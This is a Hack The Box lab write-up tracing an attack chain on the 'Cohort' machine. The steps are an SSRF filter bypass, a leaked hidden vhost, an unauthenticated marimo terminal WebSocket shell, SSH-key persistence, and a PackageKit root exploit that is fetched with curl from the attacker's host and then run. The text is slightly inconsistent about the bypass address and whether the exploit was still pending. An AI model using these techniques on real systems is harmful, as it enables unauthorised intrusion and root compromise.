---
hidden: true
---

# Cohort

**Platform:** Hack The Box · **Difficulty:** Easy · **OS:** Linux&#x20;

***

### 1. Recon

nmap - 3 ports, HTTP redirects to a hostname.

```bash
nmap -p22,80,443 10.129.244.174 -Pn -sCV -oA cohort
```

* **22** - OpenSSH 9.6p1 (Ubuntu)
* **80 / 443** - nginx 1.24.0, both redirect to `https://cohort.htb/`
* TLS cert SAN: `cohort.htb`, `*.cohort.htb` ← wildcard = vhosts matter

```bash
echo '10.129.244.174 cohort.htb' | sudo tee -a /etc/hosts
```

### 2. Web enumeration

vhost fuzzing returned nothing. Content discovery on the apex:

```bash
ffuf -w .../raft-medium-directories.txt -u https://cohort.htb/FUZZ -k -ac
```

* `/api` (301), `/assets` (301), `/status` (403)

`/status` returning **403 from outside** = localhost-only endpoint. Noted.

The "Client Insights" page has a **"Register a report source URL"** form that fetches a user-supplied URL server-side to "validate" it, and explicitly rejects internal/loopback addresses → classic **SSRF with a filter**.

### 3. SSRF - confirm + filter bypass

Pointed the form at my own listener → preview echoes the **full response body**. That echo is the read channel for the rest of the box.

The filter does a **literal string match** on the submitted URL (rejected `127.0.0.1` without resolving). Bypassed with decimal-encoded loopback:

```
http://2130706433/status      → 200 OK
```

`/status` response (internal network map):

```json
{"upstreams":[
  {"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},
  {"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},
  {"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888",
   "note":"internal analyst workspace"}
]}
```

→ leaked an **unguessable vhost** (`nb-1be3782a8afd3ad5...`) on :8888. This is why subdomain fuzzing failed — the name is random and only disclosed here.

### 4. Foothold - marimo pre-auth RCE (CVE-2026-39987)

```bash
echo '10.129.244.174 nb-1be3782a8afd3ad5.cohort.htb' | sudo tee -a /etc/hosts
```

Login page title → **marimo** (reactive Python notebook). Single password field; version string `0.20.4`.

marimo ≤ 0.20.4: **unauthenticated WebSocket RCE**. `/terminal/ws` skips the `validate_auth()` check every other WS endpoint enforces, so an unauthenticated connection yields a PTY shell. The password never matters .

* Endpoint: `wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws`
* Frames: raw xterm PTY bytes (not JSON)
* Small `websockets` Python client → shell as `uid=1000(marimo)`

Grabbed `user.txt`. Planted an SSH key in `~marimo/.ssh/authorized_keys` for a stable session.

### 5. Privilege escalation - identified & confirmed, exploit pending

The relevant vulnerability was CVE-2026-41651, a PackageKit transaction race that can allow an unprivileged local user to install a package as root. The PoC used for the lab was:

```bash
https://github.com/Vozec/CVE-2026-41651
```

The executable file in that repository was transferred to the target and run from the `marimo` shell. After successful execution, privilege escalation was verified with:

```bash
python3 -m http.server 8080
curl http://10.10.17.238:8080/cve-2026-41651 -o exploit #on foothold
chmod +x exploit
file exploit 
./exploit
```

```
id
whoami
cat /root/root.txt
```

#### Attack-chain summary

```
HTTPS portal
    -> source URL validator
    -> SSRF using 0.0.0.0
    -> /status disclosure
    -> hidden Marimo vhost
    -> unauthenticated /terminal/ws
    -> shell as marimo
    -> PackageKit 1.2.8-2ubuntu1.2
    -> CVE-2026-41651
    -> root
```



###
